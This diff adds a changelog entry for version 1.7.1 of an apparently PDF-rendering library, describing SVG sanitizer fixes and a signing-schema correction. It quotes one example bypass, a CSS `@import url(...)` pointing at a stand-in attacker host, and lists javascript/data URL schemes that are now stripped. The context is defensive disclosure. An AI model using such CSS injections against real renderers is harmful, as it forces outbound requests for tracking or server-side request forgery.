@@ -7,6 +7,28 @@ Format: [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.1.0/)
 
 ---
 
+## [1.7.1] — 2026-05-27
+
+Security hardening for SVG sanitizer + schema accuracy fix for signing fields.
+
+### Security
+
+- **SVG `<style>` block: strip `@import` rules** — `sanitizeSvg` now removes `@import` directives before any CSS can be used to trigger an outbound network request from the rasterizer. Previously only `expression()` was stripped from inline `<style>` blocks; `@import url('https://attacker.example/track.css')` would survive sanitization.
+
+- **SVG `<style>` block: strip `url(javascript:|vbscript:|data:)` values** — Removes URL function calls using JS/vbscript/data schemes from style content, closing an injection path that bypasses the existing `<a href>` and `<image href>` filters (those only target *attribute values*, not *CSS property values*).
+
+- **SVG `<style>` block: strip `url(https?://...)` values (defense-in-depth)** — SVGs embedded in PDFs have no legitimate reason to hot-link external stylesheets or background images. Removes all HTTP/HTTPS `url()` references from style blocks so the rasterizer cannot be coerced into outbound connections via crafted input.
+
+### Fixed
+
+- **`schema.ts` missing signing fields** — `signature` schema block was missing `p12`, `passphrase`, and `contactInfo` that were added to `SignatureSpec` in v1.7.0. JSON schema consumers (e.g. editors, the MCP generate_pdf tool) now see all valid signing inputs. The TypeScript type was always correct; this was a schema-only gap.
+
+### Changed
+
+- **`schema.ts` signature description** updated from "Visual signature placeholder drawn on a specified page" to reflect that providing `p12` enables PKCS#7 cryptographic signing; without `p12` a visual-only placeholder box is drawn.
+
+---
+
 ## [1.7.0] — 2026-05-25
 
 Signing path repaired. **No public API changes.** The cryptographic signing pipeline has been architecturally broken end-to-end since v1.3.6 — calling `render({ signature: { p12, passphrase } })` would fail with `SIGNATURE_FAILED: PDF signing failed: No ByteRangeStrings found within PDF buffer`. v1.7.0 fixes it with a surgical change inside `applySignature`.
